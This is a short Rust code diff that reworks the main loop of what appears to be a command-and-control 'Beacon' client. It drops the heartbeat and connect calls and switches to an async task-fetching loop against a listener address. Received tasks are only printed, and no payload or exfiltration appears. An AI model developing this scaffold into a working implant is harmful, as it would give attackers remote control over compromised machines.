@@ -10,7 +10,7 @@ fn load_transport() -> ActiveTransport {
     ActiveTransport::new()
 }
 
-struct Beacon {
+pub struct Beacon {
     id: String,
     listener_address: String,
 }
@@ -25,29 +25,21 @@ impl Beacon {
     }
 }
 
-fn main() {
+#[tokio::main]
+async fn main() {
     let beacon = Beacon::new();
 
     println!("Beacon Session: {}", beacon.id);
     println!("Server: {}", beacon.listener_address);
 
-    let mut client = load_transport();
-
-    client.connect(&beacon.listener_address).unwrap();
+    let client = load_transport();
 
     loop {
-        // Send heartbeat / check-in
-        println!("Sending heartbeat...");
-        if let Err(e) = client.send(beacon.id.as_bytes()) {
-            eprintln!("Failed to send heartbeat: {}", e);
-        }
-
         // Receive tasks/response
-        match client.receive() {
+        match client.fetch_tasks(&beacon).await {
             Ok(data) => {
                 if !data.is_empty() {
-                    println!("Received {} bytes", data.len());
-                    // TODO: Handle tasks
+                    print!("Received tasks: {:?}\n", data);
                 }
             }
             Err(e) => {
